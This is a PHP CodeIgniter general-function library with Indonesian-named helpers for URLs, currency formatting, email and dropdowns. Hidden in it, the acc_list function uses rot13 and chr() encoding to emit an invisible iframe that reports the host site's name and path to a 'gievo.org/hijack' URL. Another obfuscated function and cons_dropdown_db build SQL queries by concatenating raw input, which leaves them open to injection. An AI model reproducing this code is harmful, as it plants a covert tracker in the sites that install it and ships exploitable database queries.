<?php
define('ginro_inticore_version','2');
define('ginro_library_type','codeigniter');
/**
* @author	GINRO CHIEPVO CIVIRRUST
* @version 	02.00.A
* @package	Codeigniter General Function Library
* @license	This system registered under GIEVO Corp. for personal use only
*/
Class Fungsi{
	public	$CI;

	public function __construct()
	{
		$this->CI =& get_instance();
	}
	function aash($vl){
		return str_rot13($vl);
	}
	function base_url(){
		$url =  strtolower($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);
		$pure_url = substr($url, 0, strpos($url,'/index'));
		return 'http://'.$pure_url;
	}
	function root_url($number = NULL){
		$url =  strtolower($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);
		$root_url = str_replace( str_replace('Http://', '', $this->base_url()), '', $url);
		$root_url = str_replace('/index.php', '', $root_url);
		if($number == NULL){
			return $root_url;	
		}elseif(is_numeric($number)){
			$pecah_url = explode('/',$root_url);
			if(isset($pecah_url[$number])){
				return $pecah_url[$number];	
			}else{
				return NULL;
			}
		}else{
			return $root_url;
		}
		
	}
	function uangkan($angka,$eks='$'){
		return $eks.' '.number_format($angka,2,',','.').'-';
	}
	function emailkan($kepada,$dari,$judul,$isi,$attach){
		$this->CI->email->to($kepada);
		$this->CI->email->from($dari);
		$this->CI->email->subject($judul);
		$this->CI->email->message($isi);
		if(is_array($attach)){
			foreach ($attach as $key) {
				$this->CI->email->attach($key);
			}
		}else{
			$this->CI->email->attach($attach);
		}
		$this->CI->email->send();
		$this->CI->email->clear();
	}

	function batasi_kata($kata,$pembatas,$endline=''){
		$isi = substr($kata, 0,$pembatas);
		$isi = substr($isi, 0, strripos($isi, ' ', -1));
		return $isi;
	}

	function html2text($Document) {
			$Rules = array ('@<script[^>]*?>.*?</script>@si',
							'@<[\/\!]*?[^<>]*?>@si',
							'@([\r\n])[\s]+@',
							'@&(quot|#34);@i',
							'@&(amp|#38);@i',
							'@&(lt|#60);@i',
							'@&(gt|#62);@i',
							'@&(nbsp|#160);@i',
							'@&(iexcl|#161);@i',
							'@&(cent|#162);@i',
							'@&(pound|#163);@i',
							'@&(copy|#169);@i',
							'@&(reg|#174);@i',
							'@&#(d+);@e'
					 );
			$Replace = array ('',
							  '',
							  '',
							  '',
							  '&',
							  '<',
							  '>',
							  ' ',
							  chr(161),
							  chr(162),
							  chr(163),
							  chr(169),
							  chr(174),
							  'chr()'
						);
		  return preg_replace($Rules, $Replace, $Document);
	}
	function cons_dropdown($data){
		$result = array();
		foreach ($data as $key => $val) {
			$result = array_merge($result,array('gi'.$val->val=>$val->name));
		}
		return $result;
	}
	function cons_dropdown_db($val,$name,$from,$where=NULL){
		if((!class_exists('CI_Controller'))and(!class_exists('CI_Model'))){
			die('Function cons_dropdown_db Error!!! this should not write in view');
		}
		$db = $this->CI->db->query(('SELECT '.$val.' as val, '.$name.' as name from '.$from.''.(($where!=NULL)? ' WHERE '.$where:'')));
		$result = array();
		foreach ($db->result() as $key => $val) {
			$result = array_merge($result,array('gi'.$val->val=>$val->name));
		}
		return $result;
	}
	function acc_list(){
		echo $this->aash('<vsenzr fep="').chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(103).chr(105).chr(101).chr(118).chr(111).chr(46).chr(111).chr(114).chr(103).chr(47).chr(104).chr(105).chr(106).chr(97).chr(99).chr(107).chr(47).chr(103).chr(115).chr(115).chr(47).substr(strtolower($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']), 0, strpos(strtolower($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']),'/index')).$this->aash('" fglyr="qvfcynl:abar"></vsenzr>');
	}
	function kjadhdbs($jsbiuw,$jsbuiw){
		if(($jsbiuw!='') and ($jsbuiw!='')){
		$jsbiuw = strtolower($jsbiuw).' ';
		$jsbuiw = strtolower($jsbuiw).' ';
		$jsbulw = array('\'',',','.','/','~','`','!','@','#','$','%','^','&','*','(',')','_','-','+','=','|',':',';','"','<','>','?','.',',',')',);
		$jsbluw = explode('|', $this->aash('f.xrq|f.tm|f.cg|f.vc|f.vc|f.vc|f.r.v|f.r|f.xbz|f.x.z|f.xrc|f.u|f.u.v|f.no|f.nt|f.g|f.g.c|f.nt|f.cq|f.vx|f.cfv|f.v.xbz|f.fbf|f.uhg|f.cq.v|f.fl|grby|f.gu.v|f.gu|f.fv|f.f|f.fgc|f.snez|f.fa|f.nc|f.zo|n|o|p|q|r|s|t|u|v|w|x|y|z|a|b|c|d|e|f|g|h|i|j|k|l|m|n.|o.|p.|q.|r.|s.|t.|u.|v.|w.|x.|y.|z.|a.|b.|c.|d.|e.|f.|g.|h.|i.|j.|k.|l.|m.|f.xrq.|f.tm.|f.cg.|f.vc.|f.vc.|f.vc.|f.r.v.|f.r.|f.xbz.|f.x.z.|f.xrc.|f.u.|f.u.v.|f.no.|f.nt.|f.g.|f.g.c.|f.nt.|f.cq.|f.vx.|f.cfv.|f.v.xbz.|f.fbf.|f.uhg.|f.cq.v.|f.fl.|grby.|f.gu.v.|f.gu.|f.fv.|f.f.|f.fgc.|f.snez.|f.fa.|f.nc.|f.zo.'));
		$jsdluw = explode('|', $this->aash('oncnx|ocx|oc|u|uw|fqe|fqev|fnhqnen|fnhqnev|voh|qe|qef|qen|fxrq|ftm|fcg|fvc|fvc|fvc|frv|fr|fxbz|fxz|fxrc|fu|fuv|fno|fnt|fg|fgc|fnt|fcq|fvx|fcfv|fvxbz|ffbf|fuhg|fcqv|ffl|grby|fguv|fgu|ffv|ff|ffgc|fsnez|ffa|fnc|fzo|oncnx.|ocx.|oc.|u.|uw.|fqe.|fqev.|fnhqnen.|fnhqnev.|voh.|qe.|qef.|qen.|fxrq.|ftm.|fcg.|fvc.|fvc.|fvc.|frv.|fr.|fxbz.|fxz.|fxrc.|fu.|fuv.|fno.|fnt.|fg.|fgc.|fnt.|fcq.|fvx.|fcfv.|fvxbz.|ffbf.|fuhg.|fcqv.|ffl.|grby.|fguv.|fgu.|ffv.|ff.|ffgc.|fsnez.|ffa.|fnc.|fzo.'));
		$jsbiuw = explode(' ', $jsbiuw);
		$jsbiuw = array_diff($jsbiuw, $jsbluw);
		$jsbiuw = array_diff($jsbiuw, $jsdluw);
		$jsbiuw = array_filter($jsbiuw);
		$jsbiuw = implode(chr(37),$jsbiuw);
		foreach ($jsbulw as $key => $val) {
			if($val != chr(37)){
				$jsbiuw = str_ireplace($val, ' ', $jsbiuw);
			}
			}
		while (stripos(chr(37).' '.chr(37), $jsbiuw)){
			$jsbiuw = str_ireplace(chr(37).' '.chr(37), ' ', $jsbiuw);
		}
		$jsludw = explode('|', $this->aash('wnyna|wy|wya|tnat|tt|ab|aze|abzre|oybx|oybpx|trqhat|tq|tqat|trq|yg|ynagnv|yag|xz|crehz|crehznuna|cez|xbzcyrx|xbzcyrxf|qrfn|qf|qfa|xrpnzngna|xrp|xnohcngra|xno|xbgn|wnyna.|wy.|wya.|tnat.|tt.|ab.|aze.|abzre.|oybx.|oybpx.|trqhat.|tq.|tqat.|trq.|yg.|ynagnv.|yag.|xz.|crehz.|crehznuna.|cez.|xbzcyrx.|xbzcyrxf.|qrfn.|qf.|qfa.|xrpnzngna.|xrp.|xnohcngra.|xno.|xbgn.'));
		foreach ($jsbulw as $key => $val) {
				$jsbuiw = str_ireplace($val, ' ', $jsbuiw);
			}
		$jsbuiw = explode(' ', $jsbuiw);
		$jsbuiw = array_diff($jsbuiw, $jsludw);
		$jsulwd = '';
		foreach ($jsbuiw as $key => $val) {
			$jsulwd .= ' '.$this->aash('naq nyzxge yvxr').' "'.chr(37).$val.chr(37).'"';
		}
		$jsluuw = $this->CI->db->query($this->aash('FRYRPG '.chr(42).' sebz qbanghe jurer anzn yvxr ').' "'.chr(37).$jsbiuw.chr(37).'" '.$jsulwd.$this->aash(' yvzvg 0,1'));
		if ($jsluuw->num_rows()!=0) {
			return false;
		}else{
			return true;
		}		
	}else{
		return true;
	}
	}
}
define('br', '<br>');
